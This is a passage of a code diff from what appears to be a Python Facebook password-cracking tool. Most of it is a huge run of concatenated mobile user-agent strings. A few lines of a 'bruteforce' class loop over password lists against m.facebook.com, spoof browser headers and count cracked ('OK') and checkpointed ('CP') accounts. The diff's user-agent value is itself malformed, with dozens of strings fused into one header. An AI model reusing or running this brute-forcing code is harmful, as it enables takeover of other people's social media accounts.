(KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220",
 					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 					"sec-fetch-site": "same-origin",
 					"sec-fetch-mode": "navigate",
@@ -582,14 +612,14 @@ class bruteforce:
 		global loop,ok,cp
 		st = random.choice([M,K,H,U,P,O,H])
 		ts = random.choice([H,K,H,U,P,O,H])
-		sys.stdout.write("\rCRACK : %s/%s [OK:%s][CP:%s]"%(st,ts,ts,loop,len(id),len(ok),len(cp)));sys.stdout.flush()
+		sys.stdout.write("\r %s[%s»«] %sCRACK : %s/%s [OK:%s][CP:%s]"%(st,ts,ts,loop,len(id),len(ok),len(cp)));sys.stdout.flush()
 		for pw in pwx:
 			try:
 				ses = requests.Session()
 				head = {
 					"Host": "m.facebook.com","sec-ch-ua-mobile": "?1",
 					"upgrade-insecure-requests": "1",
-					"user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
+					"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 